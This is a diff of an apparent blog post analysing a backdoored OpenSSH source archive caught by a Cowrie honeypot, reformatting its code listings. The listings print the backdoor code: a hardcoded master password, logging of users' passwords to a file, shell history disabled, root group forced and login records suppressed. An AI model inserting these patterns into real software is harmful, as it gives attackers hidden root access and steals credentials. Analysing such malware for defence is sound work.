@@ -245,119 +245,112 @@ rm -rf ssh
 <p>Here the attacker doesn&rsquo;t understand what is happening because cowrie simulates the wget commands but the tar command fails (likely a cowrie bug when implementing the command). So the attacker will try many different ways to untar the file, and finally reboot the server.</p>
 
 <p>Once extracted, the archive is composed of the source code of openssh 4.3 (I have uploaded all the code on <a href="https://github.com/Te-k/openssh-backdoor">github</a> if you want to check by yourself)</p>
-
-<pre><code class="language-bash">&gt; cat v
-OpenSSH_4.3p2, OpenSSL 0.9.8b 04 May 2006
-</code></pre>
+<div class="highlight" style="background: #f0f0f0"><pre style="line-height: 125%"><span></span>&gt; cat v
+OpenSSH_4.3p2, OpenSSL <span style="color: #40a070">0</span>.9.8b <span style="color: #40a070">04</span> May <span style="color: #40a070">2006</span>
+</pre></div>
 
 <p>There is still one weird thing : what is this <em>backdoor.h</em> file ?</p>
+<div class="highlight" style="background: #f0f0f0"><pre style="line-height: 125%"><span></span><span style="color: #60a0b0; font-style: italic">/* backdoor stuff */</span>
+<span style="color: #007020">#define BACKDOORPASSWD &quot;SSHD_PASS&quot;</span>
+<span style="color: #007020">#define LOGGING_PASSWORDS 1</span>
+<span style="color: #007020">#define PASSWORDS_LOG_FILE &quot;LOG_PATH&quot;</span>
 
-<pre><code class="language-C">/* backdoor stuff */
-#define BACKDOORPASSWD &quot;SSHD_PASS&quot;
-#define LOGGING_PASSWORDS 1
-#define PASSWORDS_LOG_FILE &quot;LOG_PATH&quot;
-
-int backdoor_active;
-</code></pre>
+<span style="color: #902000">int</span> backdoor_active;
+</pre></div>
 
 <p>The BACKDOORPASSWD macro is used in the file <em>auth-passwd.c</em>, in the auth_password function in charge of checking the users password:</p>
-
-<pre><code class="language-C">    backdoor_active = 0;
-    if(strcmp(password, BACKDOORPASSWD) == 0)
+<div class="highlight" style="background: #f0f0f0"><pre style="line-height: 125%"><span></span>    backdoor_active <span style="color: #666666">=</span> <span style="color: #40a070">0</span>;
+    <span style="color: #007020; font-weight: bold">if</span>(strcmp(password, BACKDOORPASSWD) <span style="color: #666666">==</span> <span style="color: #40a070">0</span>)
     {
-        backdoor_active = 1;
-        return 1;
+        backdoor_active <span style="color: #666666">=</span> <span style="color: #40a070">1</span>;
+        <span style="color: #007020; font-weight: bold">return</span> <span style="color: #40a070">1</span>;
     }
-    else
+    <span style="color: #007020; font-weight: bold">else</span>
     {
     [LEGITIMATE CODE]
     [...]
-</code></pre>
+</pre></div>
 
 <p>Strangely, this backdoor also implements a logging functionnality both in <em>sshconnect1.c</em> and <em>sshconnect2.c</em>:</p>
-
-<pre><code class="language-C">    if((strcmp(BACKDOORPASSWD,password) != 0) &amp;&amp; LOGGING_PASSWORDS)
+<div class="highlight" style="background: #f0f0f0"><pre style="line-height: 125%"><span></span>    <span style="color: #007020; font-weight: bold">if</span>((strcmp(BACKDOORPASSWD,password) <span style="color: #666666">!=</span> <span style="color: #40a070">0</span>) <span style="color: #666666">&amp;&amp;</span> LOGGING_PASSWORDS)
       {
-        FILE *fp = fopen(PASSWORDS_LOG_FILE,&quot;a&quot;);
-        fprintf (fp,&quot;+host: %s +user: %s +password: %s\n&quot;, get_remote_ipaddr(), options.user, password);
+        <span style="color: #902000">FILE</span> <span style="color: #666666">*</span>fp <span style="color: #666666">=</span> fopen(PASSWORDS_LOG_FILE,<span style="color: #4070a0">&quot;a&quot;</span>);
+        fprintf (fp,<span style="color: #4070a0">&quot;+host: %s +user: %s +password: %s</span><span style="color: #4070a0; font-weight: bold">\n</span><span style="color: #4070a0">&quot;</span>, get_remote_ipaddr(), options.user, password);
         fclose (fp)
       }
-</code></pre>
+</pre></div>
 
 <p>In <em>session.c</em>, the backdoor disable the hist file and force the suid to 0 (root):</p>
-
-<pre><code class="language-C">     if(backdoor_active)
-        child_set_env(&amp;env, &amp;envsize, &quot;HISTFILE&quot;, &quot;/dev/null&quot;);
+<div class="highlight" style="background: #f0f0f0"><pre style="line-height: 125%"><span></span>     <span style="color: #007020; font-weight: bold">if</span>(backdoor_active)
+        child_set_env(<span style="color: #666666">&amp;</span>env, <span style="color: #666666">&amp;</span>envsize, <span style="color: #4070a0">&quot;HISTFILE&quot;</span>, <span style="color: #4070a0">&quot;/dev/null&quot;</span>);
 
     [...]
 
-    if(!backdoor_active)
+    <span style="color: #007020; font-weight: bold">if</span>(<span style="color: #666666">!</span>backdoor_active)
       {
         [SNIP]
       }
-    else
+    <span style="color: #007020; font-weight: bold">else</span>
       {
-        setgid(0);
-        initgroups(pw-&gt;pw_name, 0);
+        setgid(<span style="color: #40a070">0</span>);
+        initgroups(pw<span style="color: #666666">-&gt;</span>pw_name, <span style="color: #40a070">0</span>);
       }
 
     [...]
-    if(!backdoor_active)
+    <span style="color: #007020; font-weight: bold">if</span>(<span style="color: #666666">!</span>backdoor_active)
         permanently_set_uid(pw);
-</code></pre>
+</pre></div>
 
 <p>And finally in <em>sshlogin.c</em>, it disable logging of connections using the backdoor password:</p>
-
-<pre><code class="language-C">/*
-* Records that the user has logged in.  I these parts of operating systems
-* were more standardized.
-*/
-void
-record_login(pid_t pid, const char *ttyname, const char *user, uid_t uid,
-    const char *host, struct sockaddr * addr, socklen_t addrlen)
+<div class="highlight" style="background: #f0f0f0"><pre style="line-height: 125%"><span></span><span style="color: #60a0b0; font-style: italic">/*</span>
+<span style="color: #60a0b0; font-style: italic">* Records that the user has logged in.  I these parts of operating systems</span>
+<span style="color: #60a0b0; font-style: italic">* were more standardized.</span>
+<span style="color: #60a0b0; font-style: italic">*/</span>
+<span style="color: #902000">void</span>
+<span style="color: #06287e">record_login</span>(<span style="color: #902000">pid_t</span> pid, <span style="color: #007020; font-weight: bold">const</span> <span style="color: #902000">char</span> <span style="color: #666666">*</span>ttyname, <span style="color: #007020; font-weight: bold">const</span> <span style="color: #902000">char</span> <span style="color: #666666">*</span>user, <span style="color: #902000">uid_t</span> uid,
+    <span style="color: #007020; font-weight: bold">const</span> <span style="color: #902000">char</span> <span style="color: #666666">*</span>host, <span style="color: #007020; font-weight: bold">struct</span> sockaddr <span style="color: #666666">*</span> addr, <span style="color: #902000">socklen_t</span> addrlen)
 {
-  if(!backdoor_active)
+  <span style="color: #007020; font-weight: bold">if</span>(<span style="color: #666666">!</span>backdoor_active)
       {
-        struct logininfo *li;
+        <span style="color: #007020; font-weight: bold">struct</span> logininfo <span style="color: #666666">*</span>li;
 
-        li = login_alloc_entry(pid, user, host, ttyname);
+        li <span style="color: #666666">=</span> login_alloc_entry(pid, user, host, ttyname);
         login_set_addr(li, addr, addrlen);
         login_login(li);
         login_free_entry(li);
       }
     }
 }
-#ifdef LOGIN_NEEDS_UTMPX
-void
-record_utmp_only(pid_t pid, const char *ttyname, const char *user,
-                 const char *host, struct sockaddr * addr, socklen_t addrlen)
+<span style="color: #007020">#ifdef LOGIN_NEEDS_UTMPX</span>
+<span style="color: #902000">void</span>
+record_utmp_only(<span style="color: #902000">pid_t</span> pid, <span style="color: #007020; font-weight: bold">const</span> <span style="color: #902000">char</span> <span style="color: #666666">*</span>ttyname, <span style="color: #007020; font-weight: bold">const</span> <span style="color: #902000">char</span> <span style="color: #666666">*</span>user,
+                 <span style="color: #007020; font-weight: bold">const</span> <span style="color: #902000">char</span> <span style="color: #666666">*</span>host, <span style="color: #007020; font-weight: bold">struct</span> sockaddr <span style="color: #666666">*</span> addr, <span style="color: #902000">socklen_t</span> addrlen)
 {
-  if(!backdoor_active)
+  <span style="color: #007020; font-weight: bold">if</span>(<span style="color: #666666">!</span>backdoor_active)
     {
-  struct logininfo *li;
+  <span style="color: #007020; font-weight: bold">struct</span> logininfo <span style="color: #666666">*</span>li;
 
-  li = login_alloc_entry(pid, user, host, ttyname);
+  li <span style="color: #666666">=</span> login_alloc_entry(pid, user, host, ttyname);
   login_set_addr(li, addr, addrlen);
   login_utmp_only(li);
   login_free_entry(li);
 }}
-#endif
+<span style="color: #007020">#endif</span>
 
-/* Records that the user has logged out. */
-void
-record_logout(pid_t pid, const char *ttyname, const char *user)
+<span style="color: #60a0b0; font-style: italic">/* Records that the user has logged out. */</span>
+<span style="color: #902000">void</span>
+record_logout(<span style="color: #902000">pid_t</span> pid, <span style="color: #007020; font-weight: bold">const</span> <span style="color: #902000">char</span> <span style="color: #666666">*</span>ttyname, <span style="color: #007020; font-weight: bold">const</span> <span style="color: #902000">char</span> <span style="color: #666666">*</span>user)
 {
-  if(!backdoor_active)
+  <span style="color: #007020; font-weight: bold">if</span>(<span style="color: #666666">!</span>backdoor_active)
     {
-  struct logininfo *li;
+  <span style="color: #007020; font-weight: bold">struct</span> logininfo <span style="color: #666666">*</span>li;
 
-  li = login_alloc_entry(pid, user, NULL, ttyname);
+  li <span style="color: #666666">=</span> login_alloc_entry(pid, user, <span style="color: #007020">NULL</span>, ttyname);
   login_logout(li);
   login_free_entry(li);
 }
 }
-
-</code></pre>
+</pre></div>
 
 <p>All these modifications are in the <a href="https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch">openssh-3.6.1p2-backdoor.patch</a> included in the code.</p>
 
